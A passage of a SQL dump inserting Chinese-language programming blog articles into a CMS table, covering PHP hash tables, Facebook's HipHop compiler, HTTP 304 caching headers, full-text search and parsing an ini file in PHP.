&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return FALSE;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;} else {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $linklist = $this-&amp;gt;array[$this-&amp;gt;Ha($i)];&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $count = $linklist-&amp;gt;count();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; for ($j = 0; $j &amp;lt;= $count; $j++) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;if($linklist-&amp;gt;offsetGet($j)==$i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;return TRUE;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hashmod=new hash2(20);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;Ha(3));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;Ha(93));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;Ha(45));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hashmod-&amp;gt;add(2);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hashmod-&amp;gt;add(15);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hashmod-&amp;gt;add(12);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;contain(2));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;contain(15));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;contain(12));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; ?&amp;gt;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 注：①由于php的语言特性，为了简便，我使用了php里的array来做质数表。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; ②本程序中所用的质数表和质数算法来自于已有系统中的实现。一般质数表都是事先编好的，至于是哪些质数，则是通过各种算法和试验所确定的。这里的很多数字都是神奇数字，关于这方面的，可以参考我在数学思维导图里提到过的一个数字，即《一个sqrt函数所引发的血案》里提到的神秘常数。在&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E8%AE%A1%E7%AE%97%E6%9C%BA&quot; class=&quot;t_tag&quot;&gt;计算机&lt;/span&gt;世界里，类似的常数还有很多。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 到此为止，我们就大致手工构造了一个hashtable，了解了hash的一些基本概念。除了链表法，还有开放寻址法用来解决冲突。简单地讲，也就是说，一间厕所，来了一个顾客就蹲其对应的位置，如果又来一个顾客，把厕所单间门拉开，一看里面有位童鞋正在用劲，那么怎么办？很自然的，拉另一个单间的门，看看有人不，有的话就继续找坑。当然了，一般来说，这个顾客不会按顺序一个一个地拉厕所门，而是会去拉他认为有可能没有被占用的单间的门，这可以通过闻味道，听声音来辨别，这就是寻址查找算法。如果找遍了所有厕所单间，看尽了所有人的光屁股，还是找不到坑，那么这座厕所就该扩容了。当然了，厕所扩容不会就只单单增加一个坑位，而是综合考虑成本和保证不让太多顾客拉到裤子里，会多增加几个坑位，比如增加现有坑位的0.72倍。为什么是0.72呢，这是所长多年经营所得到的经验值，为了让自己的经验发扬光大，需要出去演讲，又不能太俗，总不能说“厕所坑位因子”吧，那就把把0.72叫做“装填因子”或者“扩容因子”吧。目前很多产品使用0.72这个常数。我们现在了解了hash的基本原理和构造，以及其扩容方法。对于php而言，数组使用hashtable来实现，对Hashtable来说, 定义它的时候, 不可能一次性分配足够多的内存块, 来保存未知个数的元素, 所以PHP会在初始化的时候, 只是分配一小部分内存块给HashTable, 当不够用的时候RESIZE扩容。Hashtable只能扩容, 不会减少, 所以一般总是分配一块较大的内存空间。因此php的数组，表面上只有100个元素，但实际上内存在为其分配的不止是100个坑位。即使你unset了数组元素，在符号表中，这些空闲的坑位信息还会占据内存。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 因此，php的数组并不高效，因为hash无论是性能还是内存占用都比较中庸。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 经常有人提到MD5（）加密，其实是错误的说法，MD5是一个散列函数，不属于加密。在信息安全算法中，加密算法和散列算法是两个大的不同的分类。把不定长度的输入映射到定长的128位输出上，所以MD5是一定会出现碰撞的。由于散列是单向的，所以从MD5反解出原文是不可能的。所谓的MD5破解并不是还原MD5的原文，而是构造碰撞。Hash的应用是很广泛的。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; function md6($x){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; return 250;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 这是一个碰撞的很厉害的hash函数，但他仍然是个hash函数，并且反解出原文的难度是无限大，我把它定义为MD6函数，作为MD5的升级版，来抵御任何破解行为，O(∩_∩)O哈哈~现在，你再遇到一些开源软件里的hash算法时，就大致了解其为何物了。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 你现在可以看看memcache里的hash算法了。&lt;/font&gt;', 1, 1, 0, 0, 1303896183, 1, 'admin'),
(95, 1, 'Facebook性能大提升的秘密：HipHop', '', '', '&lt;font face=&quot;Arial, Helvetica, sans-serif, 宋体 &quot;&gt;&lt;font color=&quot;#222222&quot;&gt;&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;Facebook神秘的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=PHP&quot; class=&quot;t_tag&quot;&gt;PHP&lt;/span&gt;&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E9%A1%B9%E7%9B%AE&quot; class=&quot;t_tag&quot;&gt;项目&lt;/span&gt;HipHop for PHP终于揭开面纱。这个项目由一个PHP到C++的转换&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E7%A8%8B%E5%BA%8F&quot; class=&quot;t_tag&quot;&gt;程序&lt;/span&gt;，一个重新实现的PHP运行库，和许多常用PHP扩展的重写版本构成，目的是旨在加速和优化 PHP。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;用&lt;a href=&quot;http://developers.facebook.com/news.php?story=358blog=1&quot; target=&quot;_blank&quot;&gt;Facebook 官方博客&lt;/a&gt;（无法直接访问）上项目负责人赵海平（北大1987届遗传与分子生物专业，普林斯顿&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E8%AE%A1%E7%AE%97%E6%9C%BA&quot; class=&quot;t_tag&quot;&gt;计算机&lt;/span&gt;科学博士）的话说，HipHop项目对 Facebook影响巨大。它目前已经支撑了Facebook 90%的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=Web&quot; class=&quot;t_tag&quot;&gt;Web&lt;/span&gt;流量。由于HipHop，Facebook Web&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%9C%8D%E5%8A%A1%E5%99%A8&quot; class=&quot;t_tag&quot;&gt;服务器&lt;/span&gt;上的CPU使用平均减少了50%，从而大大减少了服务器的需求。为了让这一改进也惠及社区，他们决定将之开源，希望能够进一步帮助提高更多大 型复杂PHP网站的可伸缩性。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;&lt;strong&gt;PHP和Facebook的问题&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;众所周知，Facebook的前端主要是用PHP写的。赵海平说，过去六年Facebook从PHP语言的进展上获益良多。PHP非常简单，易学易 用，好读好调试，因此新&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%B7%A5%E7%A8%8B%E5%B8%88&quot; class=&quot;t_tag&quot;&gt;工程师&lt;/span&gt;成长很快，有利地促进了Facebook的更快的创新。&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;PHP是一种脚本语言，其好处是编程效率高，能够支持产品的快速迭代。但是与传统的编译语言相比，脚本语言的CPU和内存使用效率不好。随着 Ajax&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%8A%80%E6%9C%AF&quot; class=&quot;t_tag&quot;&gt;技术&lt;/span&gt;的广泛采用，加上SNS对动态要求较高，这些缺点更显得突出。对于每月超过4000亿次PV的Facebook来说，如何实现扩展，尤其具有 挑战性。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;常见的办法是直接用C++重写PHP应用中比较复杂的部分，作为PHP扩展。实际上，PHP就转变为一种胶水语言，连接前端HTML和C++应用逻 辑。从技术角度讲这也没有问题，但是增加了技能需求，能够在整个应用上工作的工程师数量就大大减少了。&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%AD%A6%E4%B9%A0&quot; class=&quot;t_tag&quot;&gt;学习&lt;/span&gt;C++只是编写PHP扩展的第一步，接下来还要 理解&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=Zend&quot; class=&quot;t_tag&quot;&gt;Zend&lt;/span&gt; API。由于Facebook的工程团队较小，每个工程师要支持100万以上的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E7%94%A8%E6%88%B7&quot; class=&quot;t_tag&quot;&gt;用户&lt;/span&gt;。有些&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E4%BB%A3%E7%A0%81&quot; class=&quot;t_tag&quot;&gt;代码&lt;/span&gt;不是团队里每个人都能看懂，这对于Facebook是无法接 受的。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;Facebook网站本身的可伸缩性更具挑战性，因为几乎每次&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E9%A1%B5%E9%9D%A2&quot; class=&quot;t_tag&quot;&gt;页面&lt;/span&gt;浏览都是有个性化体验的登录用户发起。浏览主页 时，&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E7%B3%BB%E7%BB%9F&quot; class=&quot;t_tag&quot;&gt;系统&lt;/span&gt;需要&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%9F%A5%E8%AF%A2&quot; class=&quot;t_tag&quot;&gt;查询&lt;/span&gt;所有&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%9C%8B%E5%8F%8B&quot; class=&quot;t_tag&quot;&gt;朋友&lt;/span&gt;、朋友最重要的状态更新、 根据隐私&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E8%AE%BE%E7%BD%AE&quot; class=&quot;t_tag&quot;&gt;设置&lt;/span&gt;筛选结果，然后还要显示评论、照片等等动态，这一切都需要在一秒内完 成。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;自2007年以来，Facebook曾写过几种不同办法&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E8%A7%A3%E5%86%B3&quot; class=&quot;t_tag&quot;&gt;解决&lt;/span&gt;这些问题。其中包括用另 一种语言重写Facebook，但是由于&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%BC%80%E5%8F%91&quot; class=&quot;t_tag&quot;&gt;开发&lt;/span&gt;的复杂性和速度等原因，未能实现。他们还重写了PHP的核心部分Zend引擎，并提交给了PHP项目，但最终 还是没有获得所需的性能。最后，他们选择了HipHop，终于得偿所愿。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;有了HipHop，工程师可以编写代码，用PHP编写组合最后页面的逻辑，并能够继续快速迭代，同时后端服务使用C++, Erlang, Java, Py thon编写，提供新闻提要、搜索、聊天和其他核心&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%8A%9F%E8%83%BD&quot; class=&quot;t_tag&quot;&gt;功能&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;&lt;strong&gt;HipHop开发故事&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;赵海平透露，项目最初是来自几年前Facebook公司一次Hackathon活动（员工在一个晚上自由发挥，实验新的想法），他手工将PHP转换 为C++代码，虽然语法上很类似，但是无论是CPU还是内存使用，转换后的C++代码都大大优于PHP。于是他想，如果构建一个系统，编程实现转换，会怎 么样呢？&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;在此之前，已经有了不少改善PHP性能的方法。Zend引擎在运行时转换PHP&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%BA%90%E4%BB%A3%E7%A0%81&quot; class=&quot;t_tag&quot;&gt;源代码&lt;/span&gt;为运行在Zend虚拟机上的opcode。开源项目APC和 eAccelerator将输出缓存，为大多数PHP网站所使用。此外，还有Zend Server这样的商业产品，通过opcode优化和缓存，提高PHP速度。赵海平选择了另一条道路，将PHP直接转为C++，然后再变成本地机器码。当 然，有许多开源项目也是同样的思路，Roadsend和phc编译为C，Quercus编译为Java，而Phalanger编译为.NET。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;Hackathon之后8个月，赵海平拿出了原型，足以说明这条路可以走通，编译后的代码的确更快。不久，Iain Proctor和Minghui Yang加入进来。接下来又开发了10个月，在生产服务器上测试了6个月。然后正式上线部署，6个月之后，Facebook 90%以上的Web流量都使用了HipHop。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;按赵海平的说法，凭借HipHop，Facebook Web服务器上的CPU使用平均减少了50%，从而大大减少了服务器的需求。项目对Facebook影响巨大。为了让这一改进也惠及社区，他们决定将之开 源，希望能够进一步帮助提高更多大型复杂PHP网站的可伸缩性。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;&lt;strong&gt;HipHop的原理&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;HipHop将PHP代码转换为高度优化的C++代码，然后再用g++编译器编译。它可以保持语义等效地执行源代码，但为了提高性能，牺牲了一些很 少用到的特性，比如eval()。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;HipHop开发中的主要困难在于，在PHP和C++这两种很不一样的语言之间怎么实现转换。虽然PHP也可以写一些很巧妙的动态特性，但是大多数 PHP代码还是非常简单的。if (…) {…} else {..} 比foo($x) { include $x; } 肯定更常见。这为性能提高提供了机会。HipHop生成的代码尽可能地使用&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%87%BD%E6%95%B0&quot; class=&quot;t_tag&quot;&gt;函数&lt;/span&gt;和&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E5%8F%98%E9%87%8F&quot; class=&quot;t_tag&quot;&gt;变量&lt;/span&gt;的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E9%9D%99%E6%80%81&quot; class=&quot;t_tag&quot;&gt;静态&lt;/span&gt;绑定。同时，还使用类型推演来选出变量最可能对应的某个类型， 从而节省内存。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;转换过程分三步：&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;1. 静态分析。收集声明关系和依赖关系等信息。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;2. 类型推演。选择最合适的类型，是C++的标量？还是String, Array, classes, Object或者Variant。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;3. 代码生成。大部分直接将PHP&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E8%AF%AD%E5%8F%A5&quot; class=&quot;t_tag&quot;&gt;语句&lt;/span&gt;和表达式对应为C++的语句和表达式。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:1em;text-align:left;&quot;&gt;在开发过程中，还有一个副产品：HPHPi，是一个实验性的解释器。通过它，不编译PHP源代码也可以运行。它已经用于HipHop自身的调试中。&lt;/p&gt;\r\n&lt;p style=&quot;line-height:30px;text-indent:2em;text-align:left;&quot;&gt;HipHop在保持了PHP优点的同时，也兼得了C++的性能优势。项目总共有30万行代码，5000多个单元测试。所有这些都将以PHP开源许可 证形式发布到GitHub。&lt;/p&gt;\r\n&lt;/font&gt;&lt;/font&gt;', 1, 1, 0, 0, 1303896888, 1, 'admin'),
(96, 1, '304 Not Modified状态码', '', '', '在 Response-Header 中加上这几项： &lt;blockquote&gt;&lt;br /&gt;\r\n&lt;p&gt;Last-Modified: Wed, 18 Jun 2008 14:22:27 GMT&lt;br /&gt;\r\nCache-Control:  max-age=600&lt;br /&gt;\r\nExpires: Wed, 18 Jun 2008 14:48:39 GMT&lt;br /&gt;\r\nDate: Wed, 18  Jun 2008 14:38:39 GMT&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/blockquote&gt;\r\n&lt;p&gt;其中 Last-Modified 后面的日期是上次更新 config 的时间，Date 后面是当前时间，Expires 后面是当前时间 +  10分钟，10分钟就是 Cache-Control 后面的 max-age，单位是秒。因为看到 GAE 对 static 文件的 Cache  时间也是10分钟，所以我使用了这个数字。&lt;/p&gt;\r\n&lt;h3&gt;Last-Modified&lt;/h3&gt;\r\n&lt;p&gt;如果客户端收到的 Response 中包含 Last-Modified，那么下次 request 的时候就会在 Request  Header 中包含 If-Modified-Since 字段，值就是上次服务器发送的 Last-Modified，服务器端会判断上次的  config 时间是否比 If-Modified-Since 晚。如果自上次 request 之后又更新了  config，那么服务器就会返回完整的内容；如果期间没有更新 config，那么服务器就没必要返回完整的内容，只需要向客户端发送一个 304  Not Modified 状态码就可以了。&lt;/p&gt;\r\n&lt;h3&gt;Cache-Control、Date 和 Expires&lt;/h3&gt;\r\n&lt;p&gt;这几个参数的组合，表示告诉浏览器：这个文件在多长时间之内不会更改，在这个时间内不需要再 request，保守起见，我设置了10分钟。&lt;/p&gt;\r\n&lt;h3&gt;浏览器行为&lt;/h3&gt;\r\n&lt;p&gt;如果只是在网站的链接之间 click click click，那么浏览器会完全遵守上述行为。这样可以尽可能地减少请求次数，以及  response 的数据量。&lt;/p&gt;\r\n&lt;p&gt;如果在某个页面点击了浏览器的刷新按钮或者按 F5，浏览器会忽略 Expires 时间，把该页面需要的所有的文件都重新请求一遍。&lt;/p&gt;\r\n&lt;p&gt;如果按住 Ctrl 再刷新或者 Ctrl-F5 (俗称强制刷新)，浏览器将不会发送 Last-Modified  Header，将所有需要的文件请求一遍，服务器会返回文件的完整内容，而不是仅仅一个 304 Not Modified 状态码。&lt;/p&gt;\r\n&lt;h3&gt;后记&lt;/h3&gt;\r\n&lt;p&gt;经初步观察，现在浏览器不会每次都彪呼呼地去请求一大堆 css、jpg、gif  文件了，浏览器也不会每次都脑残地返回完整内容了，看来是有效了。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1303952426, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(97, 1, '全文检索概念-搜索技术', '', '', '全文检索是指计算机索引程序通过扫描文章中的每一个词，对每一个词建立一个索引，指明该词在文章中出现的次数和位置，当用户查询时，检索程序就根据事先建立的索引进行查找，并将查找的结果反馈给用户的检索方式。这个过程类似于通过字典中的检索字表查字的过程。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;全文检索的方法主要分为按字检索和按词检索两种。按字检索是指对于文章中的每一个字都建立索引，检索时将词分解为字的组合。对于各种不同的语言而言，字有不同的含义，比如英文中字与词实际上是合一的，而中文中字与词有很大分别。按词检索指对文章中的词，即语义单位建立索引，检索时按词检索，并且可以处理同义项等。英文等西方文字由于按照空白切分词，因此实现上与按字处理类似，添加同义处理也很容易。中文等东方文字则需要切分字词，以达到按词索引的目的，关于这方面的问题，是当前全文检索技术尤其是中文全文检索技术中的难点，在此不做详述。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;全文检索系统是按照全文检索理论建立起来的用于提供全文检索服务的软件系统。一般来说，全文检索需要具备建立索引和提供查询的基本功能，此外现代的全文检索系统还需要具有方便的用户接口、面向WWW的开发接口、二次应用开发接口等等。功能上，全文检索系统核心具有建立索引、处理查询返回结果集、增加索引、优化索引结构等等功能，外围则由各种不同应用具有的功能组成。结构上，全文检索系统核心具有索引引擎、查询引擎、文本分析引擎、对外接口等等，加上各种外围应用系统等等共同构成了全文检索系统。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;p align=&quot;center&quot;&gt;&lt;img class=&quot;zoom&quot; id=&quot;aimg_47&quot; title=&quot;C6TTT{(]7T878LR3]Q2D4UY.jpg&quot; onclick=&quot;zoom(this, this.src)&quot; alt=&quot;C6TTT{(]7T878LR3]Q2D4UY.jpg&quot; src=&quot;http://bbs.xungle.com/data/attachment/forum/month_1006/100609221719076d8e7b7fd18e.jpg&quot; width=&quot;600&quot; status=&quot;2&quot; outfunc=&quot;null&quot; unselectable=&quot;true&quot; initialized=&quot;true&quot; file=&quot;data/attachment/forum/month_1006/100609221719076d8e7b7fd18e.jpg&quot; /&gt; &lt;/p&gt;\r\n&lt;p&gt;&lt;/p&gt;\r\n&lt;p align=&quot;center&quot;&gt;图1.1&lt;/p&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; 展示了上述全文检索系统的结构与功能。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;在上图中，我们看到：全文检索系统中最为关键的部分是全文检索引擎，各种应用程序都需要建立在这个引擎之上。一个全文检索应用的优异程度，根本上由全文检索引擎来决定。因此提升全文检索引擎的效率即是我们提升全文检索应用的根本。另一个方面，一个优异的全文检索引擎，在做到效率优化的同时，还需要具有开放的体系结构，以方便程序员对整个系统进行优化改造，或者是添加原有系统没有的功能。比如在当今多语言处理的环境下，有时需要给全文检索系统添加处理某种语言或者文本格式的功能，比如在英文系统中添加中文处理功能，在纯文本系统中添加XML或者HTML格式的文本处理功能，系统的开放性和扩充性就十分的重要。', 1, 1, 0, 0, 1304428191, 1, 'admin'),
(98, 1, 'php 删除空行与注释，并解读ini文件', '', '', '&lt;p&gt;&amp;lt;?php &lt;br /&gt;\r\nfunction get_fields()&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $str = file_get_contents(''./mybb.ini'');&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; $se = array(&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;#;.*#&quot;,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;#[\\n]{2,}#&quot;,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;#\\n\\s+#&quot;,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; );&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $re = array(&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;&quot;, &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;\\n&quot;,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;&quot;,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; );&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; $str = preg_replace($se,$re,$str);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fielding =&amp;nbsp; explode(&quot;[field]&quot;,$str);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $fields = array();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $i = -1;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; foreach($fielding as $k=&amp;gt;$v)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $i++;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $v = trim($v);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $arr_v = explode(&quot;\\n&quot;,$v);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; foreach($arr_v as $type=&amp;gt;$value)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; list($k1,$v1) = explode(&quot;=&quot;,$value);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $fields[$i][$k1] = $v1;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return $fields;&lt;br /&gt;\r\n}&lt;/p&gt;\r\n&lt;p&gt;?&amp;gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1304429176, 1, 'admin'),
